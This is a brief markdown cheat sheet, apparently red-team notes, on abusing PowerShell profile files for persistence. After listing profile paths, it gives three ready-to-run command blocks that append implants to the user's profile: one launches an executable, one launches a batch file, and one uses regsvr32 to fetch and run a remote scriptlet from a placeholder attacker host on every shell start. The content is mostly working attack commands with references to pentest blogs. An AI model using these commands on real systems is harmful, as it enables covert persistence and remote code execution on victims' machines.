# PowerShell Profile

## 01 - Common Files Location

### 1.1 - Unix

```
$PSHOME\Profile.ps1
$PSHOME\Microsoft.PowerShell_profile.ps1
```

### 1.2 - Windows

```
C:\Users\$Env:USERNAME\Documents\PowerShell\Profile.ps1
C:\Users\$Env:USERNAME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1
```

## 02 - Dropper Implant

```powershell
PS C:\> Write-Output $profile
Test-Path $profile
New-Item -Path $profile -Type File -Force
$string = 'Start-Process "C:\tmp\pentestlab.exe"'
$string | Out-File -FilePath "C:\Users\$Env:USERNAME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

## 03 - Batch Script Dropper Implant

```powershell
PS C:\> Write-Output $profile
Test-Path $profile
New-Item -Path $profile -Type File -Force
Add-Content $profile "Invoke-Item C:\tmp\launcher.bat"
$string | Out-File -FilePath "C:\Users\$Env:USERNAME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

## 04 - Web Delivery

```powershell
PS C:\> Write-Output $profile
Test-Path $profile
New-Item -Path $profile -Type File -Force
$string = 'Invoke-Command -ScriptBlock { regsvr32.exe /s /n /u /i:http://<IP>/shell.sct scrobj.dll }'
$string | Out-File -FilePath "C:\Users\$Env:USERNAME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

---
## References

### Persistence Info

- [Persistence Info: PowerShell Profile](https://persistence-info.github.io/Data/powershellprofile.html)

### Pentestlab

- [Pentestlab Blog: Persistence Powershell Profile](https://pentestlab.blog/2019/11/05/persistence-powershell-profile/)

### enigma0x3

- [enigma0x3: Abusing Powershell Profiles](https://enigma0x3.net/2014/06/16/abusing-powershell-profiles/)

### Github

- [enigma0x3: PowershellProfile Macro](https://github.com/enigma0x3/PowershellProfile/blob/master/Macro)